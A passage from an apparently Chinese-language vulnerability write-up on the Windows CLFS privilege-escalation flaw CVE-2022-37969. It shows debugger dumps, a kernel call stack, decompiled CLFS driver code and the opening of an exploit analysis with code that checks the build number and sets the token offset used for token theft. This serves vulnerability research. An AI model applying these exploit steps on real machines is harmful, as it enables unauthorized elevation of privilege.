</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d528  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d538  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffd70e<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>48</span>d9d548  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> k
</span></span><span style=display:flex><span> <span style=color:#75715e># Child-SP          RetAddr               Call Site
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>00</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa5e0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b6f120b     CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x10f</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>01</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa640 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b6f8b0f     CLFS<span style=color:#f92672>!</span>CClfsLogFcbPhysical<span style=color:#f92672>::</span>DeleteBaseFileAndContainers<span style=color:#f92672>+</span><span style=color:#ae81ff>0xf3</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>02</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa690 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b6f8761     CLFS<span style=color:#f92672>!</span>CClfsLogFcbPhysical<span style=color:#f92672>::</span>Finalize<span style=color:#f92672>+</span><span style=color:#ae81ff>0x39b</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>03</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa6c0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b71df42     CLFS<span style=color:#f92672>!</span>CClfsLogFcbPhysical<span style=color:#f92672>::</span>Release<span style=color:#f92672>+</span><span style=color:#ae81ff>0xb1</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>04</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa720 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b720878     CLFS<span style=color:#f92672>!</span>CClfsRequest<span style=color:#f92672>::</span>Close<span style=color:#f92672>+</span><span style=color:#ae81ff>0xd6</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>05</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa770 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b720747     CLFS<span style=color:#f92672>!</span>ClfsDispatchIoRequest<span style=color:#f92672>+</span><span style=color:#ae81ff>0x108</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>06</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa7c0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>d8abac5     CLFS<span style=color:#f92672>!</span>CClfsDriver<span style=color:#f92672>::</span>LogIoDispatch<span style=color:#f92672>+</span><span style=color:#ae81ff>0x27</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>07</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa7f0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>dbf088f     nt<span style=color:#f92672>!</span>IofCallDriver<span style=color:#f92672>+</span><span style=color:#ae81ff>0x55</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa830 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>dc19af0     nt<span style=color:#f92672>!</span>IopDeleteFile<span style=color:#f92672>+</span><span style=color:#ae81ff>0x14f</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>09</span> fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa8b0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>d8ae1a7     nt<span style=color:#f92672>!</span>ObpRemoveObjectRoutine<span style=color:#f92672>+</span><span style=color:#ae81ff>0x80</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>a fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa910 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>dc22449     nt<span style=color:#f92672>!</span>ObfDereferenceObjectWithTag<span style=color:#f92672>+</span><span style=color:#ae81ff>0xc7</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>b fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aa950 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>dc2627c     nt<span style=color:#f92672>!</span>ObCloseHandleTableEntry<span style=color:#f92672>+</span><span style=color:#ae81ff>0x6c9</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>c fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aaa90 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>da0a2b5     nt<span style=color:#f92672>!</span>NtClose<span style=color:#f92672>+</span><span style=color:#ae81ff>0xec</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>d fffff88e<span style=color:#960050;background-color:#1e0010>`</span>db5aab00 <span style=color:#ae81ff>00007ff</span><span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b48d124     nt<span style=color:#f92672>!</span>KiSystemServiceCopyEnd<span style=color:#f92672>+</span><span style=color:#ae81ff>0x25</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>e <span style=color:#ae81ff>0000001</span>d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>518f</span>e678 <span style=color:#ae81ff>00007ff</span><span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>08</span>bea405     ntdll<span style=color:#f92672>!</span>NtClose<span style=color:#f92672>+</span><span style=color:#ae81ff>0x14</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0f</span> <span style=color:#ae81ff>0000001</span>d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>518f</span>e680 <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0x00007ff8</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>08</span>bea405
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> u
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x10f</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ebf <span style=color:#ae81ff>498</span>b7f18        mov     rdi,qword ptr [r15<span style=color:#f92672>+</span><span style=color:#ae81ff>18</span>h]
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ec3 <span style=color:#ae81ff>4885ff</span>          test    rdi,rdi
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ec6 <span style=color:#ae81ff>0f</span><span style=color:#ae81ff>84</span>b9000000    je      CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1d5</span> (fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716f85)
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ecc <span style=color:#ae81ff>4983671800</span>      and     qword ptr [r15<span style=color:#f92672>+</span><span style=color:#ae81ff>18</span>h],<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ed1 <span style=color:#ae81ff>65488</span>b142588010000 mov   rdx,qword ptr gs:[<span style=color:#ae81ff>188</span>h]
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716eda <span style=color:#ae81ff>488</span>b4e20        mov     rcx,qword ptr [rsi<span style=color:#f92672>+</span><span style=color:#ae81ff>20</span>h]
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ede <span style=color:#ae81ff>4</span>c8b15c3d1ffff  mov     r10,qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>_imp_ExReleaseResourceForThreadLite</span> (fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b7140a8)]
</span></span><span style=display:flex><span>fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>b716ee5 e8a6552102      call    nt<span style=color:#f92672>!</span><span style=color:#a6e22e>ExReleaseResourceForThreadLite</span> (fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>d92c490)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>RemoveContainer</span>(CClfsBaseFilePersisted <span style=color:#f92672>*</span>this, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> a2)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> v2; <span style=color:#75715e>// r12
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  BOOLEAN v4; <span style=color:#75715e>// r14
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> BaseLogRecord; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v6; <span style=color:#75715e>// rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v7; <span style=color:#75715e>// r14d
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> Symbol; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v9; <span style=color:#75715e>// ebx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> _CLFS_CONTAINER_CONTEXT <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// r15
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v11; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v12; <span style=color:#75715e>// rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v13; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  BOOLEAN v15; <span style=color:#75715e>// [rsp+20h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v16; <span style=color:#75715e>// [rsp+24h] [rbp-34h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> _CLFS_CONTAINER_CONTEXT <span style=color:#f92672>*</span>v17; <span style=color:#75715e>// [rsp+70h] [rbp+18h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v2 <span style=color:#f92672>=</span> a2;
</span></span><span style=display:flex><span>  v17 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ExAcquireResourceExclusiveLite</span>(<span style=color:#f92672>*</span>((PERESOURCE <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>), <span style=color:#ae81ff>1u</span>);
</span></span><span style=display:flex><span>  v15 <span style=color:#f92672>=</span> v4;
</span></span><span style=display:flex><span>  BaseLogRecord <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetBaseLogRecord</span>(this);
</span></span><span style=display:flex><span>  v6 <span style=color:#f92672>=</span> BaseLogRecord;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>BaseLogRecord )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v9 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>    v16 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_20;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  v7 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(BaseLogRecord <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>808</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v7 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v9 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1073741816</span>;
</span></span><span style=display:flex><span>LABEL_14:
</span></span><span style=display:flex><span>    v16 <span style=color:#f92672>=</span> v9;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_19;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  Symbol <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetSymbol</span>(this, v7, v2, <span style=color:#f92672>&amp;</span>v17);
</span></span><span style=display:flex><span>  v9 <span style=color:#f92672>=</span> Symbol;
</span></span><span style=display:flex><span>  v16 <span style=color:#f92672>=</span> Symbol;
</span></span><span style=display:flex><span>  v10 <span style=color:#f92672>=</span> v17;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v17 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( Symbol <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v9 <span style=color:#f92672>=</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>RemoveSymbol</span>(this, v7);
</span></span><span style=display:flex><span>      v16 <span style=color:#f92672>=</span> v9;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v9 <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LODWORD</span>(v17) <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>808</span>);
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>808</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>RtlClearBits</span>((PRTL_BITMAP)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>232</span>), v2, <span style=color:#ae81ff>1u</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>RtlNumberOfSetBits</span>((PRTL_BITMAP)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>232</span>));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)v10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>9</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>          <span style=color:#f92672>--*</span>(_DWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>300</span>);
</span></span><span style=display:flex><span>        v11 <span style=color:#f92672>=</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>FlushImage</span>(this);
</span></span><span style=display:flex><span>        v9 <span style=color:#f92672>=</span> v11;
</span></span><span style=display:flex><span>        v16 <span style=color:#f92672>=</span> v11;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( v11 <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          v12 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)v10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( v12 )
</span></span><span style=display:flex><span>          {
</span></span><span style=display:flex><span>            <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)v10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>ExReleaseResourceForThreadLite</span>(<span style=color:#f92672>*</span>((PERESOURCE <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>), (ERESOURCE_THREAD)<span style=color:#a6e22e>KeGetCurrentThread</span>());
</span></span><span style=display:flex><span>            v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>            (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>void</span> (<span style=color:#66d9ef>__fastcall</span> <span style=color:#f92672>**</span>)(<span style=color:#66d9ef>__int64</span>))(<span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)v12 <span style=color:#f92672>+</span> <span style=color:#ae81ff>24</span>i64))(v12);
</span></span><span style=display:flex><span>            (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>void</span> (<span style=color:#66d9ef>__fastcall</span> <span style=color:#f92672>**</span>)(<span style=color:#66d9ef>__int64</span>))(<span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)v12 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>i64))(v12);
</span></span><span style=display:flex><span>            v9 <span style=color:#f92672>=</span> v16;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> LABEL_20;
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>goto</span> LABEL_19;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( v11 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1073741816</span> )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          v13 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>OffsetToAddr</span>(this);
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( v13 )
</span></span><span style=display:flex><span>          {
</span></span><span style=display:flex><span>            <span style=color:#f92672>*</span>(_BYTE <span style=color:#f92672>*</span>)(v13 <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>            <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>808</span>) <span style=color:#f92672>=</span> (_DWORD)v17;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>RtlSetBits</span>((PRTL_BITMAP)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>232</span>), v2, <span style=color:#ae81ff>1u</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)v10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>9</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>              <span style=color:#f92672>++*</span>(_DWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>300</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> LABEL_19;
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>          v9 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>goto</span> LABEL_14;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>LABEL_19:
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> v15;
</span></span><span style=display:flex><span>LABEL_20:
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v4 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>ExReleaseResourceForThreadLite</span>(<span style=color:#f92672>*</span>((PERESOURCE <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>), (ERESOURCE_THREAD)<span style=color:#a6e22e>KeGetCurrentThread</span>());
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> v16;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v9;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>最后附上zscaler画的流程图</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/6.png></p><blockquote><p><a href=https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part target=_blank>https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part</a></p></blockquote><h3 id=exp分析>EXP分析</h3><p>首先通过查询<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuild</code> 来确定系统版本是否在范围内，因为在_EPROCESS中_TOKEN偏移是不固定的，此次所使用的偏移为0x4B8.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;SOFTWARE</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows NT</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>CurrentVersion&#34;</span>), NULL, KEY_READ, <span style=color:#f92672>&amp;</span>hKey) <span style=color:#f92672>==</span> ERROR_SUCCESS) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Registry key Opened successfully</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>RegQueryValueEx</span>(hKey, <span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;CurrentBuild&#34;</span>), NULL, <span style=color:#f92672>&amp;</span>cType, (LPBYTE)lpData, <span style=color:#f92672>&amp;</span>buffersize);
</span></span><span style=display:flex><span>	<span style=color:#75715e>//										-1表示处理整个缓冲区
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>WideCharToMultiByte</span>(CP_UTF8, <span style=color:#ae81ff>0</span>, lpData, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, (LPSTR)buf, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	winversion <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(buf);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>wprintf</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[+] Windows Build Number: %i</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, winversion);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (winversion <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>17763</span> <span style=color:#f92672>&amp;&amp;</span> winversion <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>22000</span>) {
</span></span><span style=display:flex><span>		token_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4b8</span>;  <span style=color:#75715e>// store the token offset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[!] Version %d not supported. Exiting...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, winversion);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>exit</span>(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
